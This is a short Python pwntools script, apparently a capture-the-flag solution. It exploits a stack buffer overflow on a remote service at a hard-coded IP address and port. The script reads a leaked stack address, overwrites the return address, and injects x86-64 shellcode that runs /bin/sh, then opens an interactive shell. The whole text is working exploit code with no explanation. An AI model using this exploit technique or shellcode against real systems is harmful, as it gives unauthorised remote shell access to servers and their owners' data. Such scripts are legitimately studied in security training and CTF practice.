
import re
import struct
from pwn import *

conn = remote('35.238.225.156', 1006)

received = conn.recvuntil('now\n')
print(received.decode())

reg = re.search('.*\[(.*)\].*',received.decode())
assert reg, log.error('Stack address not found !')

stack_addr = reg.group(1).encode()
stack_addr = int(stack_addr,16) 
log.info('Stack addresss is at {}'.format(hex(stack_addr)))


overflow = b'A'*24
ret = struct.pack('Q',stack_addr+len(overflow)+8)
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = overflow + ret + shell

log.info('Sending payload...')
conn.send(payload + b'\n')

log.success('Executing /bin/sh : ')
conn.interactive()
